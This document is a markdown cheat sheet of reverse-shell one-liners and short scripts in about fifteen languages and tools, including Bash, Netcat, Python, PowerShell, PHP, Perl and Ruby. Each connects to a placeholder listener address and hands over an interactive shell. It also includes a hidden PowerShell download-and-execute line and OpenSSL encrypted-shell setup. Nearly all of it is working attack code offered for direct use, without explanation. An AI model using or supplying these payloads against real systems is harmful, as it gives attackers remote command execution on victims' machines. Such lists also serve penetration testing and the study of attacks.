# Reverse Shells

### Awk
```
Method 1:
awk 'BEGIN {s = "/inet/tcp/0/<listener-IP>/<listener-port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Bash
```
#TCP

Method 1:
bash -i >& /dev/tcp/<listener-IP>/<listener-port> 0>&1

Method 2:
0<&196;exec 196<>/dev/tcp/<listener-IP>/<listener-port>; sh <&196 >&196 2>&196

#UDP

Method 1:
sh -i >& /dev/udp/<listener-IP>/<listener-port> 0>&1
* Make sure NC listener uses "-u" to specify UDP
```

### Golang
```
Method 1:
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<listener-IP>:<listener-port>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Groovy
```
Method 1:
String host="<listener-IP>";
int port=<listener-port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Java
```
Method 1:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<listener-IP>/<listener-port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])

Method 2:
String host="<listener-IP>";
int port=<listener-port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
p.waitFor()
```

### Lua
```
#Linux

Method 1:
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<listener-IP>','<listener-port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"

#Windows/Linux

Method 1:
lua5.1 -e 'local host, port = "<listener-IP>", <listener-port> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### Ncat
```
#TCP

Method 1:
ncat <listener-IP> <listener-port> -e /bin/bash
Method 1b:
ncat <listener-IP> <listener-port> -e /bin/sh

#UDP

Method 2:
ncat --udp <listener-IP> <listener-port> -e /bin/bash
Method 2b:
ncat --udp <listener-IP> <listener-port> -e /bin/sh
```

### Netcat
```
#Traditional

Method 1:
nc -e /bin/bash <listener-IP> <listener-port>

Method 2:
nc -e /bin/sh <listener-IP> <listener-port>

Method 3:
nc -c bash <listener-IP> <listener-port>

#BSD

Method 1:
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc <listener-IP> <listener-port> 1>/tmp/backpipe

Method 2:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <listener-IP> <listener-port> >/tmp/f
```

### NodeJS
```
Method 1:
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<listener-port>, "<listener-IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

Method 2:
require('child_process').exec('nc -e /bin/sh <listener-IP> <listener-port>')

Method 3:
-var x = global.process.mainModule.require
-x('child_process').exec('nc <listener-IP> <listener-port> -e /bin/bash')
```

### OpenSSL
```
Method 1:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <listening-IP>:<listening-port> > /tmp/s; rm /tmp/s

Listening Method 1:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <listening-port>

Listening Method 2:
ncat --ssl -vv -l -p <listening-port>
```

### Perl
```
#Linux

Method 1:
perl -e 'use Socket;$i="<listener-IP>";$p=<listener-port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#Windows

Method 1:
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<listener-IP>:<listener-port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

#Windows/Linux

Method 1:
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<listener-IP>:<listener-port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PHP
```
Method 1:
php -r '$sock=fsockopen("<listener-IP>",<listener-port>);exec("/bin/sh -i <&3 >&3 2>&3");'

Method 2:
php -r '$sock=fsockopen("<listener-IP>",<listener-port>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Powershell
```
Method 1:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<listener-IP>",<listener-port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Method 2:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<listener-IP>',<listener-port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Method 3: (hosted revshell.ps1)
powershell IEX (New-Object Net.WebClient).DownloadString('http://<file-host-IP>:<file-host-port>/<filename>.ps1')
```

### Python
```
#Linux IPv4

Method 1:
export RHOST="<listner-IP>";export RPORT=<listener-port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

Method 2:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<listener-IP>",<listener-port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

#Linux IPv6

Method 1:
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<listener-IP>",<listener-port>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

#Windows IPv4

Method 1:
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<listener-IP>', <listener-port>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### Ruby
```
#Linux

Method 1:
ruby -rsocket -e'f=TCPSocket.open("<listener-IP>",<listener-port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Method 2:
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<listener-IP>","<listener-port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#Windows

Method 1:
ruby -rsocket -e 'c=TCPSocket.new("<listener-IP>","<listener-port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
